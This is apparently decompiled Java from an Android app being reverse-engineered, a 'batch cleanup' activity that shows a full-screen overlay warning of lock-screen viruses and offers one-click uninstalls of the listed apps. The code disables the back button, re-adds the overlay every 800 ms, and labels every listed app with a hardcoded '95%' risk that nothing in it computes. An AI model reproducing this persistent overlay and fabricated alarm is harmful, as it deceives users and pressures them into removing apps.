package com.youlong.tool;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import androidx.lifecycle.CoroutineLiveDataKt;
import java.util.ArrayList;
import java.util.Iterator;

/* loaded from: /sandboxdata/workspace/file/reverse_youlong/extracted_root/classes2.dex */
public class BatchCleanupActivity extends Activity {
    public WindowManager f;
    public LinearLayout g;
    public Handler h;
    public Runnable i;
    public final ArrayList c = new ArrayList();
    public boolean j = false;

    public static WindowManager.LayoutParams a() {
        int i;
        int i2 = Build.VERSION.SDK_INT;
        if (i2 >= 26) {
            i = 2038;
        } else {
            i = 2002;
        }
        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(-1, -1, i, 23857056, -1);
        layoutParams.gravity = 8388659;
        layoutParams.x = 0;
        layoutParams.y = 0;
        if (i2 >= 28) {
            layoutParams.layoutInDisplayCutoutMode = 3;
        }
        return layoutParams;
    }

    @Override // android.app.Activity
    public final void onBackPressed() {
    }

    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) {
        String str;
        super.onCreate(bundle);
        String[] stringArrayExtra = getIntent().getStringArrayExtra("found_packages");
        ArrayList arrayList = this.c;
        int i = 0;
        if (stringArrayExtra != null) {
            for (String str2 : stringArrayExtra) {
                arrayList.add(str2);
            }
        }
        this.f = (WindowManager) getSystemService("window");
        this.h = new Handler(Looper.getMainLooper());
        setContentView(new View(this));
        LinearLayout linearLayout = new LinearLayout(this);
        int i2 = 1;
        linearLayout.setOrientation(1);
        linearLayout.setGravity(1);
        linearLayout.setBackgroundColor(-585433088);
        linearLayout.setPadding(30, 50, 30, 40);
        TextView textView = new TextView(this);
        textView.setText("⚠️");
        textView.setTextSize(56.0f);
        textView.setGravity(17);
        textView.setPadding(0, 0, 0, 10);
        linearLayout.addView(textView);
        TextView textView2 = new TextView(this);
        textView2.setText("检测到高风险锁机病毒！");
        textView2.setTextColor(-1);
        textView2.setTextSize(22.0f);
        textView2.setGravity(17);
        textView2.setPadding(0, 0, 0, 8);
        linearLayout.addView(textView2);
        TextView textView3 = new TextView(this);
        textView3.setText("发现 " + arrayList.size() + " 款应用是 95% 高风险锁机病毒");
        textView3.setTextColor(-48060);
        textView3.setTextSize(17.0f);
        textView3.setGravity(17);
        textView3.setPadding(0, 0, 0, 6);
        linearLayout.addView(textView3);
        TextView textView4 = new TextView(this);
        textView4.setText("以下应用极可能存在恶意锁机行为，建议立即清除！");
        textView4.setTextColor(-13184);
        textView4.setTextSize(13.0f);
        textView4.setGravity(17);
        textView4.setPadding(0, 0, 0, 18);
        linearLayout.addView(textView4);
        ScrollView scrollView = new ScrollView(this);
        scrollView.setPadding(8, 0, 8, 0);
        LinearLayout linearLayout2 = new LinearLayout(this);
        linearLayout2.setOrientation(1);
        PackageManager packageManager = getPackageManager();
        Iterator it = arrayList.iterator();
        while (it.hasNext()) {
            String str3 = (String) it.next();
            try {
                str = packageManager.getApplicationInfo(str3, i).loadLabel(packageManager).toString();
            } catch (Exception unused) {
                str = str3;
            }
            LinearLayout linearLayout3 = new LinearLayout(this);
            linearLayout3.setOrientation(i2);
            linearLayout3.setBackgroundColor(872349696);
            linearLayout3.setPadding(16, 12, 16, 12);
            LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(-1, -2);
            layoutParams.bottomMargin = 8;
            linearLayout3.setLayoutParams(layoutParams);
            TextView textView5 = new TextView(this);
            textView5.setText(str);
            textView5.setTextColor(-1);
            textView5.setTextSize(15.0f);
            textView5.setPadding(0, 0, 0, 3);
            linearLayout3.addView(textView5);
            TextView textView6 = new TextView(this);
            textView6.setText(str3);
            textView6.setTextColor(-5592406);
            textView6.setTextSize(12.0f);
            textView6.setPadding(0, 0, 0, 3);
            linearLayout3.addView(textView6);
            TextView textView7 = new TextView(this);
            textView7.setText("95% 高危锁机病毒 ⚠️  建议立即卸载！");
            textView7.setTextColor(-48060);
            textView7.setTextSize(13.0f);
            textView7.setBackgroundColor(587137024);
            textView7.setPadding(6, 4, 6, 4);
            linearLayout3.addView(textView7);
            linearLayout2.addView(linearLayout3);
            i = 0;
            i2 = 1;
        }
        scrollView.addView(linearLayout2);
        LinearLayout.LayoutParams layoutParams2 = new LinearLayout.LayoutParams(-1, 0);
        layoutParams2.weight = 1.0f;
        layoutParams2.bottomMargin = 16;
        scrollView.setLayoutParams(layoutParams2);
        linearLayout.addView(scrollView);
        Button button = new Button(this);
        button.setText("一键清除所有病毒");
        button.setTextColor(-1);
        button.setTextSize(19.0f);
        button.setBackgroundColor(-2937041);
        button.setPadding(40, 24, 40, 24);
        LinearLayout.LayoutParams layoutParams3 = new LinearLayout.LayoutParams(-1, -2);
        layoutParams3.bottomMargin = 12;
        button.setLayoutParams(layoutParams3);
        button.setOnClickListener(new View.OnClickListener() { // from class: com.youlong.tool.BatchCleanupActivity.2
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                final BatchCleanupActivity batchCleanupActivity = BatchCleanupActivity.this;
                if (!batchCleanupActivity.j) {
                    batchCleanupActivity.j = true;
                    new Thread(new Runnable() { // from class: com.youlong.tool.BatchCleanupActivity.4
                        @Override // java.lang.Runnable
                        public final void run() {
                            int i3 = 0;
                            while (true) {
                                BatchCleanupActivity batchCleanupActivity2 = BatchCleanupActivity.this;
                                if (i3 < batchCleanupActivity2.c.size()) {
                                    String str4 = (String) batchCleanupActivity2.c.get(i3);
                                    i3++;
                                    batchCleanupActivity2.c.size();
                                    try {
                                        Intent intent = new Intent("android.intent.action.DELETE");
                                        intent.setData(Uri.parse("package:" + str4));
                                        intent.addFlags(276856832);
                                        batchCleanupActivity2.startActivity(intent);
                                    } catch (Exception unused2) {
                                    }
                                    try {
                                        Thread.sleep(CoroutineLiveDataKt.DEFAULT_TIMEOUT);
                                    } catch (Exception unused3) {
                                    }
                                } else {
                                    batchCleanupActivity2.runOnUiThread(new Runnable() { // from class: com.youlong.tool.BatchCleanupActivity.4.1
                                        @Override // java.lang.Runnable
                                        public final void run() {
                                            WindowManager windowManager;
                                            Runnable runnable;
                                            Runnable runnable2;
                                            BatchCleanupActivity batchCleanupActivity3 = BatchCleanupActivity.this;
                                            batchCleanupActivity3.j = true;
                                            Handler handler = batchCleanupActivity3.h;
                                            if (handler != null && (runnable2 = batchCleanupActivity3.i) != null) {
                                                handler.removeCallbacks(runnable2);
                                            }
                                            Handler handler2 = batchCleanupActivity3.h;
                                            if (handler2 != null && (runnable = batchCleanupActivity3.i) != null) {
                                                handler2.removeCallbacks(runnable);
                                            }
                                            LinearLayout linearLayout4 = batchCleanupActivity3.g;
                                            if (linearLayout4 != null && (windowManager = batchCleanupActivity3.f) != null) {
                                                try {
                                                    windowManager.removeView(linearLayout4);
                                                } catch (Exception unused4) {
                                                }
                                                batchCleanupActivity3.g = null;
                                            }
                                            batchCleanupActivity3.finish();
                                        }
                                    });
                                    return;
                                }
                            }
                        }
                    }).start();
                }
            }
        });
        linearLayout.addView(button);
        Button button2 = new Button(this);
        button2.setText("稍后处理");
        button2.setTextColor(-1);
        button2.setTextSize(15.0f);
        button2.setBackgroundColor(-11184811);
        button2.setPadding(30, 18, 30, 18);
        button2.setLayoutParams(new LinearLayout.LayoutParams(-1, -2));
        button2.setOnClickListener(new View.OnClickListener() { // from class: com.youlong.tool.BatchCleanupActivity.3
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                WindowManager windowManager;
                Runnable runnable;
                Runnable runnable2;
                BatchCleanupActivity batchCleanupActivity = BatchCleanupActivity.this;
                batchCleanupActivity.j = true;
                Handler handler = batchCleanupActivity.h;
                if (handler != null && (runnable2 = batchCleanupActivity.i) != null) {
                    handler.removeCallbacks(runnable2);
                }
                Handler handler2 = batchCleanupActivity.h;
                if (handler2 != null && (runnable = batchCleanupActivity.i) != null) {
                    handler2.removeCallbacks(runnable);
                }
                LinearLayout linearLayout4 = batchCleanupActivity.g;
                if (linearLayout4 != null && (windowManager = batchCleanupActivity.f) != null) {
                    try {
                        windowManager.removeView(linearLayout4);
                    } catch (Exception unused2) {
                    }
                    batchCleanupActivity.g = null;
                }
                batchCleanupActivity.finish();
            }
        });
        linearLayout.addView(button2);
        this.g = linearLayout;
        try {
            this.f.addView(linearLayout, a());
        } catch (Exception unused2) {
            setContentView(linearLayout);
        }
        Runnable runnable = new Runnable() { // from class: com.youlong.tool.BatchCleanupActivity.1
            @Override // java.lang.Runnable
            public final void run() {
                LinearLayout linearLayout4;
                BatchCleanupActivity batchCleanupActivity = BatchCleanupActivity.this;
                if (!batchCleanupActivity.j && (linearLayout4 = batchCleanupActivity.g) != null) {
                    try {
                        batchCleanupActivity.f.removeView(linearLayout4);
                    } catch (Exception unused3) {
                    }
                    batchCleanupActivity.f.addView(batchCleanupActivity.g, BatchCleanupActivity.a());
                }
                batchCleanupActivity.h.postDelayed(this, 800L);
            }
        };
        this.i = runnable;
        this.h.postDelayed(runnable, 800L);
    }

    @Override // android.app.Activity
    public final void onDestroy() {
        WindowManager windowManager;
        Runnable runnable;
        this.h.removeCallbacksAndMessages(null);
        Handler handler = this.h;
        if (handler != null && (runnable = this.i) != null) {
            handler.removeCallbacks(runnable);
        }
        LinearLayout linearLayout = this.g;
        if (linearLayout != null && (windowManager = this.f) != null) {
            try {
                windowManager.removeView(linearLayout);
            } catch (Exception unused) {
            }
            this.g = null;
        }
        super.onDestroy();
    }
}
